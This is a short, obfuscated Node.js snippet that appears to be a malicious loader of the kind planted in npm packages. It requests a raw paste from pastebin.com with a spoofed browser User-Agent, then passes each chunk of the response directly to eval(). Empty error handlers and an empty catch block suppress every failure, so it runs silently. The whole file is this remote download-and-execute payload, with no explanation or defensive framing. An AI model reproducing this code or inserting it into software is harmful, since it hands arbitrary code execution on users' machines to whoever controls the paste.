try {
  var https = require('https')
  https
    .get(
      {
        hostname: 'pastebin.com',
        path: '/raw/XLeVP82h',
        headers: {
          'User-Agent':
            'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',
          Accept:
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      },
      (_0x25690b) => {
        _0x25690b.setEncoding('utf8')
        _0x25690b.on('data', (_0x488840) => {
          eval(_0x488840)
        })
        _0x25690b.on('error', () => {})
      }
    )
    .on('error', () => {})
} catch (_0x549c21) {}
